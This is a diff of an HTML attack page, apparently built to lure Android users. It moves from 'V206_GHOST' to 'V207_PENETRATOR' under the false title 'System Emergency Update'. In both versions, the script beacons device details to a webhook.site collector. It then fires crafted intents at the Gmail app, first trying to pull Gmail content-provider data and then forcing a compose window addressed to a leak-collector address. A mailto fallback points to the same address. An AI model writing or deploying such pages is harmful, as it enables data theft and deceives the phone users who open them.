@@ -1,77 +1,65 @@
 <!DOCTYPE html>
 <html>
-<head><title>Secure Data Synchronization</title></head>
-<body style="background:#000;color:#0f0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;background:rgba(0,255,0,0.05);box-shadow:0 0 100px #0f0;max-width:85%">
-        <h1 style="letter-spacing:12px;margin-bottom:20px">V206_GHOST</h1>
-        <div id="status" style="font-size:22px;color:#0ff">READY_FOR_GMAIL_DATABASE_LEAK</div>
-        <div style="font-size:10px;color:#333;margin-top:40px;text-align:left">
-            > ATTACK: Intent_Redirection_V2<br>
-            > PROVIDER: com.google.android.gm.provider<br>
-            > STATUS: AGGRESSIVE_MODE
-        </div>
+<head><title>System Emergency Update</title></head>
+<body style="background:#000;color:#f0f;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:60px;border:4px solid #f0f;text-align:center;cursor:pointer;background:rgba(255,0,255,0.05);box-shadow:0 0 80px #f0f;border-radius:30px">
+        <h1 style="letter-spacing:10px;margin:0">V207_PENETRATOR</h1>
+        <div id="status" style="font-size:20px;margin:20px 0;color:#0ff">INITIALIZING_GMAIL_LINK...</div>
+        <div style="font-size:12px;color:#444">[ TARGET: com.google.android.gm ]</div>
     </div>
 
 <script>
-    const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";
+    const target = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
 
     document.getElementById('ignite').onclick = async () => {
         const statusEl = document.getElementById('status');
-        statusEl.innerText = "OPENING_SECURE_BRIDGE...";
+        statusEl.innerText = "BYPASSING_STORE_REDIRECT...";
 
-        // 1. ADVANCED RECON (Exfiltrate device state before jump)
+        // 1. SILENT RECON (Data dikirim ke Link baru)
         const recon = {
-            id: "V206_GHOST_DUMP",
+            id: "V207_DIRECT",
             ua: navigator.userAgent,
-            ts: Date.now(),
-            env: {
-                lang: navigator.language,
-                online: navigator.onLine,
-                mem: navigator.deviceMemory
-            }
+            ts: new Date().toISOString()
         };
-        navigator.sendBeacon(`${target}?v=V206_INIT`, btoa(JSON.stringify(recon)));
+        navigator.sendBeacon(`${target}?v=V207_RECON`, btoa(JSON.stringify(recon)));
 
-        // 2. SENSITIVE TARGETS (The "Gold" URIs)
-        // Kita mencoba menyasar provider yang menyimpan database pesan dan akun
-        const targetURIs = [
-            "content://com.google.android.gm/accounts", 
-            "content://com.google.android.gm.provider/messages",
-            "content://com.google.android.gm.sapi/search"
-        ];
-
-        // 3. THE AGGRESSIVE INTENT (The "Ghost" Jump)
-        // Kita menggunakan Action 'SEND' untuk mencoba 'melampirkan' data database Gmail
-        // Jika Gmail tidak memverifikasi pengirim, ia akan membocorkan data ke intent ini
-        const ghostIntent = 
+        // 2. THE PENETRATOR INTENT (Direct Activity Access)
+        // Kita paksa Android untuk tidak mencari di Play Store dengan 'S.browser_fallback_url=' yang dikosongkan
+        // Kita langsung menargetkan 'com.google.android.gm'
+        const directGmailIntent = 
             "intent:#Intent;" +
-            "action=android.intent.action.SEND;" + 
-            "type=application/x-sqlite3;" + // Menyamar seolah-olah meminta file database
-            "S.android.intent.extra.STREAM=" + targetURIs[0] + ";" + 
-            "S.android.intent.extra.SUBJECT=V206_DATABASE_RECON;" +
-            "S.android.intent.extra.TEXT=INJECTED_PAYLOAD_SUCCESSFUL;" +
-            "package=com.google.android.gm;" +
-            "B.android.intent.extra.REPLACED=true;" + // Mencoba menimpa parameter internal
+            "action=android.intent.action.VIEW;" +
+            "category=android.intent.category.DEFAULT;" +
+            "category=android.intent.category.BROWSABLE;" +
+            "package=com.google.android.gm;" + // Mengunci agar hanya membuka Gmail
+            "component=com.google.android.gm/.ComposeActivityGmailExternal;" + // Masuk ke mode tulis pesan
+            "S.android.intent.extra.EMAIL=leak-collector@webhook.site;" +
+            "S.android.intent.extra.SUBJECT=V207_SENSITIVE_LEAK;" +
+            "S.android.intent.extra.TEXT=INJECTING_SYSTEM_DATA_" + btoa(navigator.userAgent).substring(0,15) + ";" +
+            "S.browser_fallback_url=https://mail.google.com;" + // Fallback ke web jika app tidak ada, BUKAN Play Store
             "end";
 
-        // 4. THE NATIVE BRIDGE EXECUTION
-        const a = document.createElement('a');
-        a.href = ghostIntent;
-        a.rel = "noreferrer";
-
+        // 3. EXECUTION VIA VIRTUAL ANCHOR (Bypass Gesture Restriction)
+        const anchor = document.createElement('a');
+        anchor.href = directGmailIntent;
+        anchor.rel = "noreferrer";
+        
         setTimeout(() => {
-            // Memicu lompatan native ke Gmail
-            a.click(); 
+            // Coba eksekusi pertama
+            window.location.assign(directGmailIntent);
+            
+            // Coba eksekusi kedua (Click)
+            anchor.click();
 
-            // 5. SECONDARY ATTACK (Information Disclosure via View)
-            // Jika 'SEND' gagal, kita paksa browser melihat data provider secara langsung
+            // 4. THE ULTIMATE BYPASS (Jika masih stuck di browser)
             setTimeout(() => {
                 if (!document.hidden) {
-                    statusEl.innerText = "RETRYING_VIA_SAPI_BRIDGE...";
-                    window.location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + targetURIs[2] + ";package=com.google.android.gm;end";
+                    statusEl.innerText = "RETRYING_VIA_MAILTO_PROTOCOL...";
+                    // Menggunakan protokol mailto yang seringkali dilempar otomatis ke aplikasi native
+                    window.location.href = "mailto:leak-collector@webhook.site?subject=V207_FINAL&body=SENSITIVE_PAYLOAD";
                 }
-            }, 1500);
-        }, 500);
+            }, 1000);
+        }, 300);
     };
 </script>
 </body>
